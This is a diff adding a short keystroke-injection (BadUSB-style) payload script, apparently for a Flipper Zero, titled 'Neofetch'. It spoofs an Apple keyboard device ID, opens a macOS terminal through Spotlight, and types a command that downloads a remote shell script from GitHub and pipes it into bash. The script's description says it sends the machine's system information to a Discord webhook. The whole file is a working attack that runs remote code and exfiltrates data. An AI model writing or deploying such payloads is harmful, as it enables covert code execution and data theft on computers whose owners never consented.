@@ -1,0 +1,17 @@
+ID 1234:5678 Apple:Keyboard
+
+REM     Title: Neofetch
+REM     Author: AymericLeFeyer
+REM     Description: This payload is used to send neofetch informations into a discord webhook
+REM     Target: UNIX
+
+REM Open terminal window
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING curl https://raw.githubusercontent.com/AymericLeFeyer/flipper-zero/main/neofetch.sh | bash
+ENTER
